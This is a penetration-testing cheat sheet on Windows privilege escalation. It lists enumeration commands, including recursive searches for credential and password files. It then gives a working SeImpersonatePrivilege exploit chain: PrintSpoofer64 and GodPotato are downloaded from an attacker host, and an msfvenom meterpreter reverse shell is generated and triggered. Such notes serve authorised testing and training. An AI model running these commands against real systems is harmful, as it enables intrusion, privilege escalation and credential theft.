# 04 - Privilege Escalation

Index
- [System Enumeration](#System-Enumeration)
- [SeImpersonatePrivilege](#SeImpersonatePrivilege)
    - [Exploit by PrintSpoofer64](#Exploit-by-PrintSpoofer64)
    - [Exploit by GodPotato](#Exploit-by-GodPotato)

## System Enumeration
Base commands and tools for Windows:
``` bash
whoami                                  ## domain\username
whoami /groups                          ## my groups
whoami /priv                            ## user's local privileges
Get-LocalUser                           ## local users list
Get-LocalGroup                          ## local groups list
Get-LocalGroupMember $GROUP_NAME        ## members list
net user $USERNAME                      ## user information

systeminfo                              ## OS version, domain config, ...
ipconfig /all                           ## network configuration
route print                             ## local routing table
netstat -nao                            ## acctive connections and listening ports
Get-ChildItem Env:                      ## environment vars -- tips: informations hidden
Get-Process                             ## process list

Get-History                             ## history
(Get-PSReadlineOption).HistorySavePath  ## read the content to access the history

Get-ChildItem -Path c:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue                             ## search for interesting file
Get-ChildItem -Path c:\ -Include *.pdf -File -Recurse -ErrorAction SilentlyContinue                             ## search for interesting file
Get-ChildItem -Path c:\ -Include credential* -File -Recurse -ErrorAction SilentlyContinue                       ## search for interesting file
Get-ChildItem -Path c:\ -Include password* -File -Recurse -ErrorAction SilentlyContinue                         ## search for interesting file

Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname ## installed software
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname             ## installed software
```

Tools:
 - winPEAS.exe
 - Seatbelt.exe

## SeImpersonatePrivilege
### Requirements
- Need access to the target system.
- Verify user's privileges:
``` powershell
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled     ## possibly vulnerable
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

### Exploit by PrintSpoofer64
PrintSpoofer64.exe can exploit the local system and elevate the privileges.
``` powershell
iwr http://192.168.1.1:8888/PrintSpoofer64.exe -outfile PrintSpoofer64.exe      ## download on target system
.\PrintSpoofer64.exe -i -c powershell.exe                                       ## exploit
```

### Exploit by GodPotato
GodPotato.exe can exploit the local system and run command with elevate privilege. Useful link: https://jlajara.gitlab.io/Potatoes_Windows_Privesc.

Generate a payload and a listester:
``` bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$KALI LPORT=443 -f exe -o payload.exe   ## generate payload
msfconsole                                                                                      ## open msfconsole
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_https                 ## set payload
msf6 exploit(multi/handler) > set LHOST $KALI
msf6 exploit(multi/handler) > set LPORT 443
msf6 exploit(multi/handler) > run
```

Exploit the system:
``` powershell
iwr http://192.168.1.1:8888/payload.exe -outfile payload.exe                                    ## download payload on target system
iwr http://192.168.1.1:8888/GodPotato.exe -outfile GodPotato.exe                                ## download exploit on target system
./GodPotato.exe -cmd "powershell /c ./payload.exe"                                              ## exploit: open a reverse shell
```
